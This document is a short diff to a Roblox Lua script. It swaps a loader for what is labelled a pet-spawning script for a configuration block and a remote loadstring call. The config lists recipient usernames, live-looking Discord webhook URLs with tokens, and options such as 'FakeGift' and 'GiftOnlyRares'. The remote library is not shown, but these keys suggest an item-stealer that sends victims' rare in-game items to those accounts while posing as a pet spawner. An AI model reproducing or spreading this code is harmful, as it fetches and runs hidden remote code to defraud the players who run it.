@@ -1,1 +1,12 @@
-loadstring(game:HttpGetAsync('https://codeberg.org/snaczukss/snaczuks-hub/src/commit/3e81e7b12a750a384ff04af3a0ef459e40717078/spawn-pets.lua'))()
+_G.NullConfig = {
+    User = {'sfirrr', 'hopalan5426'},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1396692523354951700/hOUOB5gzj4tIZ2WrJ8oYi6ocAxqTwhW3ggN1ix4nQAJt3iFcaC84p2L7o4ryD7L46zoa",
+    FakeGift = "No",
+    Trash = "https://discord.com/api/webhooks/1396692584973467748/RL47GysHfkEcyxF79lKd_jmmegp1JkNXtc1HGW1E0Nr4dbK-TPrMQxBDJVugiFQXLmER",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes"
+}
+
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
